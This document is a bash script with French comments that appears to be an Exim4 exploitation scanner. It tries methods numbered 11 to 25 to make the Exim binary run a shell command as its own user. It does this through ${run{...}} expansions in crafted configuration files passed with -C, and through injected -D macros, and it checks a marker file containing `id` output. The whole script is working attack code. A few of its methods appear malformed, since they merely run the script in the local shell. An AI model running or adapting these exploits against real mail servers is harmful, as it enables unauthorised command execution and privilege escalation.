#!/bin/bash

echo "Scanner avancé d'exécution de commande pour Exim4"
echo "=============================================="

# Créer un fichier témoin
MARKER_FILE="/tmp/exim_test_marker"
MARKER_CONTENT="Exim exploit test $(date)"

# Créer un script de test
SCRIPT_PATH="/tmp/exim_test_script.sh"
cat > $SCRIPT_PATH << EOF
#!/bin/bash
echo "$MARKER_CONTENT" > $MARKER_FILE
chmod 777 $MARKER_FILE
id >> $MARKER_FILE
EOF
chmod +x $SCRIPT_PATH

echo "[*] Fichier témoin: $MARKER_FILE"
echo "[*] Script de test: $SCRIPT_PATH"

# Fonction pour vérifier si l'exploitation a réussi
check_success() {
    if [ -f "$MARKER_FILE" ]; then
        echo "[!] SUCCÈS! Le fichier témoin a été créé: $MARKER_FILE"
        echo "[+] Contenu du fichier témoin:"
        cat "$MARKER_FILE"
        rm -f "$MARKER_FILE"
        return 0
    else
        echo "[-] Échec de la méthode"
        return 1
    fi
}

# Méthode 11: Configuration avec ACL
echo -e "\n[+] Test de la méthode 11: Configuration avec ACL"
CONFIG_PATH="/tmp/exim_exploit11.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = localhost

begin acl
  acl_check_rcpt:
    warn
      set acl_m0 = \${run{/bin/sh -c "$SCRIPT_PATH"}}
    accept
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 12: Configuration avec authenticators
echo -e "\n[+] Test de la méthode 12: Configuration avec authenticators"
CONFIG_PATH="/tmp/exim_exploit12.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = localhost

begin authenticators
  plain:
    driver = plaintext
    public_name = PLAIN
    server_prompts = :
    server_condition = \${run{/bin/sh -c "$SCRIPT_PATH"}}
    server_set_id = \$2
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 13: Configuration avec rewrite
echo -e "\n[+] Test de la méthode 13: Configuration avec rewrite"
CONFIG_PATH="/tmp/exim_exploit13.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = localhost

begin rewrite
  *@* \${run{/bin/sh -c "$SCRIPT_PATH"}}@localhost
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 14: Configuration avec retry
echo -e "\n[+] Test de la méthode 14: Configuration avec retry"
CONFIG_PATH="/tmp/exim_exploit14.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = localhost

begin retry
  * * F,1h,\${run{/bin/sh -c "$SCRIPT_PATH"}}
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 15: Configuration avec redirect_router
echo -e "\n[+] Test de la méthode 15: Configuration avec redirect_router"
CONFIG_PATH="/tmp/exim_exploit15.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = localhost

begin routers
  redirect_router:
    driver = redirect
    data = \${run{/bin/sh -c "$SCRIPT_PATH"}}
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 16: Configuration avec pipe_transport
echo -e "\n[+] Test de la méthode 16: Configuration avec pipe_transport"
CONFIG_PATH="/tmp/exim_exploit16.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = localhost

begin transports
  pipe_transport:
    driver = pipe
    command = \${run{/bin/sh -c "$SCRIPT_PATH"}}
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 17: Configuration avec address_data
echo -e "\n[+] Test de la méthode 17: Configuration avec address_data"
CONFIG_PATH="/tmp/exim_exploit17.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = localhost

begin routers
  test_router:
    driver = accept
    address_data = \${run{/bin/sh -c "$SCRIPT_PATH"}}
    transport = local_delivery
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 18: Configuration avec headers_add
echo -e "\n[+] Test de la méthode 18: Configuration avec headers_add"
CONFIG_PATH="/tmp/exim_exploit18.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = localhost

begin transports
  local_delivery:
    driver = appendfile
    file = /dev/null
    headers_add = X-Test: \${run{/bin/sh -c "$SCRIPT_PATH"}}
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 19: Configuration avec condition
echo -e "\n[+] Test de la méthode 19: Configuration avec condition"
CONFIG_PATH="/tmp/exim_exploit19.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = localhost

begin routers
  test_router:
    driver = accept
    condition = \${run{/bin/sh -c "$SCRIPT_PATH"}}
    transport = local_delivery
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV"
/usr/sbin/exim4 -C$CONFIG_PATH -bV
check_success

# Méthode 20: Configuration avec debug_print
echo -e "\n[+] Test de la méthode 20: Configuration avec debug_print"
CONFIG_PATH="/tmp/exim_exploit20.conf"
cat > $CONFIG_PATH << EOF
primary_hostname = localhost

begin routers
  test_router:
    driver = accept
    debug_print = \${run{/bin/sh -c "$SCRIPT_PATH"}}
    transport = local_delivery
EOF
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C$CONFIG_PATH -bV -d"
/usr/sbin/exim4 -C$CONFIG_PATH -bV -d
check_success

# Méthode 21: Exim -DEXIM_MACRO option
echo -e "\n[+] Test de la méthode 21: Exim -DEXIM_MACRO option"
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C/dev/null -DEXIM_MACRO='\${run{/bin/sh -c \"$SCRIPT_PATH\"}}'"
/usr/sbin/exim4 -C/dev/null -DEXIM_MACRO="\${run{/bin/sh -c \"$SCRIPT_PATH\"}}"
check_success

# Méthode 22: Exim -DEXIM_MACRO avec syntaxe alternative
echo -e "\n[+] Test de la méthode 22: Exim -DEXIM_MACRO avec syntaxe alternative"
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C/dev/null -DEXIM_MACRO='`$SCRIPT_PATH`'"
/usr/sbin/exim4 -C/dev/null -DEXIM_MACRO="`$SCRIPT_PATH`"
check_success

# Méthode 23: Exim -DEXIM_MACRO avec syntaxe alternative 2
echo -e "\n[+] Test de la méthode 23: Exim -DEXIM_MACRO avec syntaxe alternative 2"
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C/dev/null -DEXIM_MACRO='$(run $SCRIPT_PATH)'"
/usr/sbin/exim4 -C/dev/null -DEXIM_MACRO="$(run $SCRIPT_PATH)"
check_success

# Méthode 24: Exim -DEXIM_MACRO avec syntaxe alternative 3
echo -e "\n[+] Test de la méthode 24: Exim -DEXIM_MACRO avec syntaxe alternative 3"
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C/dev/null -DEXIM_MACRO='$(run {/bin/sh -c \"$SCRIPT_PATH\"})'"
/usr/sbin/exim4 -C/dev/null -DEXIM_MACRO="$(run {/bin/sh -c \"$SCRIPT_PATH\"})"
check_success

# Méthode 25: Exim -DEXIM_MACRO avec syntaxe alternative 4
echo -e "\n[+] Test de la méthode 25: Exim -DEXIM_MACRO avec syntaxe alternative 4"
echo "[DEBUG] Exécution de la commande: /usr/sbin/exim4 -C/dev/null -DEXIM_MACRO='$(/bin/sh -c \"$SCRIPT_PATH\")'"
/usr/sbin/exim4 -C/dev/null -DEXIM_MACRO="$(/bin/sh -c \"$SCRIPT_PATH\")"
check_success

echo -e "\n[*] Tests terminés."
